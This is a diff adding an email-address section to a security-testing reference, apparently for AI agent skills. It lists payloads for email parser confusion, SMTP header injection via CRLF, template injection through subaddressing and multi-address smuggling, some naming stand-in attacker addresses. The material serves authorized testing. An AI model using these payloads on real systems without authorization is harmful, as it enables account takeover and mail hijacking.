@@ -3,6 +3,62 @@
 Use this reference when a skill needs concrete test ideas, bypass themes, or
 gotchas. Keep validation inside the scope and safety rules in `scope-safety.md`.
 
+## Email Addresses
+
+Email addresses are two attack surfaces: the parser that decides where mail
+goes, and the mail builder that concatenates user input into SMTP headers
+or templates. PortSwigger's 2024 "Splitting the email atom" research showed
+that even RFC-compliant addresses can route to a domain other than the one
+the application validated.
+
+Splitting-the-atom payloads (parser disagreement):
+
+- encoded-word: `=?x?q?abccollab=40psres=2enet?=@target.com`
+- quoted local-part: `"a@b"@target.com`, `"<script>"@target.com`
+- comments and nested comments: `user(comment)@target.com`
+- Unicode overflow: codepoints where `chr(x) % 256 == 0x40` (e.g. `ŀ`,
+  `❀`) yield extra `@` after `chr()` collapse
+- punycode generators: `xn--0117.example.com` -> `@@`,
+  `xn--0049.com` -> `,`, `xn--694` -> `;`, `xn--svg/-9x6` -> `<svg/`
+- SMTP routing legacy: source routes, UUCP bang paths
+  (`oastify.com!user@target.com`), percent-hack
+  (`collab%psres.net@target.com`)
+
+SMTP header injection payloads (CRLF in user fields):
+
+- raw `\r\n`, URL-encoded `%0d%0a`, double-encoded `%250d%250a`
+- Unicode line separators: U+2028, U+2029, U+0085 (NEL)
+- vertical tab `\v`, form feed `\f`
+- target headers: `Bcc:`, `Subject:`, `Reply-To:`, full
+  `Content-Type: multipart/mixed; boundary=` body smuggling
+
+Subaddressing tampering (RFC 5233):
+
+- SSTI via template-rendered email: `victim+{{7*7}}@target.com` and
+  observe whether the rendered welcome/reset email shows `49`
+- domain-allowlist abuse: `attacker+anything@allowed.com`
+- account-link confusion: `a@x.com` vs `a+1@x.com` deduplication
+
+Multiple addresses in one field:
+
+- comma/semicolon: `victim@target.com,attacker@evil.com`
+- newline-separated addresses
+- via IDNA: `xn--0049.com` decodes to literal `,`
+
+Unicode normalisation and homoglyph:
+
+- `user@exămple.com` with `ă` (U+0103) for `a`
+- mixed-script Latin + Cyrillic
+- normalise-after-uniqueness-check bugs enabling password-reset rebinding
+
+Domain-based authorization gotchas:
+
+- never trust substring after the last `@`
+- compare parser behaviour at app vs SMTP server
+- distinguish display-only sanitisation from routing decisions
+
+See `skills/email-testing/SKILL.md` for the full workflow.
+
 ## Open Redirects
 
 Open redirect coverage was missing from the first pass. Treat it as a must-test
